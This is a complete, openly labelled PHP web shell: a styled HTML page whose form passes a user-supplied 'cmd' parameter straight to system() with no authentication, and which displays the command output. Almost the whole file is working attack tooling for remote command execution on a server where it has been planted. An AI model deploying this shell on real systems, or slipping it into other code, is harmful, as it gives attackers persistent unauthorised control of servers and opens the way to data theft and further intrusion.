<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PHP Web Shell</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #1e1e1e;
            color: #d4d4d4;
            margin: 0;
            padding: 0;
        }
        .container {
            width: 80%;
            margin: 20px auto;
            padding: 20px;
            background-color: #252526;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
        }
        h1 {
            text-align: center;
            color: #61dafb;
        }
        form {
            display: flex;
            justify-content: space-between;
        }
        input[type="text"] {
            width: 85%;
            padding: 10px;
            border: 1px solid #555;
            border-radius: 4px;
            background-color: #1e1e1e;
            color: #d4d4d4;
        }
        input[type="submit"] {
            width: 10%;
            padding: 10px;
            border: none;
            border-radius: 4px;
            background-color: #61dafb;
            color: #1e1e1e;
            font-weight: bold;
            cursor: pointer;
        }
        .output {
            margin-top: 20px;
            padding: 10px;
            background-color: #1e1e1e;
            border: 1px solid #555;
            border-radius: 4px;
            white-space: pre-wrap;
            font-family: monospace;
            color: #dcdcaa;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>PHP Web Shell</h1>
        <form method="POST">
            <input type="text" name="cmd" placeholder="Enter your command here" autofocus required>
            <input type="submit" value="Run">
        </form>
        <div class="output">
            <?php
            if (isset($_POST['cmd'])) {
                // Recupera il comando inviato dall'utente
                $cmd = $_POST['cmd'];

                // Puoi usare il comando system, exec, shell_exec o passthru per eseguire il comando
                echo "<strong>Command:</strong> " . htmlspecialchars($cmd) . "<br><br>";
                echo "<strong>Output:</strong><br>";

                // Esegui il comando e mostra l'output
                echo "<pre>";
                system($cmd);  // Esegui il comando
                echo "</pre>";
            }
            ?>
        </div>
    </div>
</body>
</html>
